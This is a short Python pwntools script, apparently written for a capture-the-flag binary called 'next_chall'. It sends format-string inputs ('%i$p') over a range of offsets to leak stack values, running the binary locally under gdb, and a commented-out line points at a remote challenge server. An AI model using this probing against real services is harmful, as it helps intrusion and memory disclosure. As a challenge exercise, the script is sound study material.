from pwn import *

# io = remote("3.75.185.198", 7000)
io = process("./next_chall")
io = gdb.debug("./next_chall", '''
b *0x080491ed
c''')
context.log_level = 'debug' 

for i in range(1, 300):
    io = process("./next_chall")
    io = gdb.debug("./next_chall", '''
    b *0x080491ed
    c''')
    io.sendline(f"%{i}$p")
    try:
        print(f"recieved at {i}: {io.recvline()}")
    except:
        continue